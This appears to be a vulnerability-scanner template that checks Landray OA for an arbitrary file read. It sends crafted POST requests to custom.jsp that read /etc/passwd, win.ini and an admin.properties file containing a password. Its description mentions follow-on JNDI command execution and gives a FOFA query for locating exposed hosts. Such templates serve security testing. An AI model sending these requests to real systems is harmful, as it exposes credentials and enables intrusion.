expression: r0() || windows0() || linux0()
id: landray-oa-custom-jsp-file-read
info:
  author: B1anda0(https://github.com/B1anda0)
  description: "\u6DF1\u5733\u5E02\u84DD\u51CC\u8F6F\u4EF6\u80A1\u4EFD\u6709\u9650\
    \u516C\u53F8\u6570\u5B57OA(EKP)\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\
    \u6F0F\u6D1E\u3002\u653B\u51FB\u8005\u53EF\u5229\u7528\u6F0F\u6D1E\u83B7\u53D6\
    \u654F\u611F\u4FE1\u606F\uFF0C\u8BFB\u53D6\u914D\u7F6E\u6587\u4EF6\u5F97\u5230\
    \u5BC6\u94A5\u540E\u8BBF\u95EE admin.do \u5373\u53EF\u5229\u7528 JNDI\u8FDC\u7A0B\
    \u547D\u4EE4\u6267\u884C\u83B7\u53D6\u6743\u9650\nfofa: app=\"Landray-OA\u7CFB\
    \u7EDF\"\n"
  name: Landray OA Custom JSP file rread
  reference:
  - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
  - http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20admin.do%20JNDI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html
  severity: critical
  verified: true
rules:
  linux0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      body: var={"body":{"file":"file:///etc/passwd"}}
      method: POST
      path: /sys/ui/extend/varkind/custom.jsp
  r0:
    expression: response.status == 200 && response.body.bcontains(b'password') &&
      response.body.bcontains(b'kmss.properties.encrypt.enabled')
    request:
      body: var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
      method: POST
      path: /sys/ui/extend/varkind/custom.jsp
  windows0:
    expression: response.status == 200 && response.body.bcontains(b"bit app support")
      && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
    request:
      body: var={"body":{"file":"file:///c://windows/win.ini"}}
      method: POST
      path: /sys/ui/extend/varkind/custom.jsp
